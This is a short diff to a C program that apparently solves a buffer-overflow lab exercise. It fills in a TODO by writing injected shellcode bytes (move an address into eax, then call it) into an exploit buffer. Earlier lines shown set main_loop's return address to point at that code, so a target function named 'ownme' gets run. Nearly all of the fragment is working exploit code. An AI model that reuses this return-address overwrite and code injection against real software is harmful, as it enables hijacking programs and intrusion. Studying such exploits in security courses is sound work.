@@ -210,9 +210,7 @@ int main(int argc, char* argv[]) {
    exploit[162/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 2;
    exploit[174/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 3;
 
-   // TODO: INJECT CODE TO CALL OWNME AT OFFSET 256 IN EXPLOIT BUFFER
-   // MAIN_LOOP'S RA IS ALREADY BEING SET TO POINT TO THIS LOCATION
-
+   // Inject code
    char injected_code[] =
       "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
       "\xFF\xD0"              /* call *%eax */
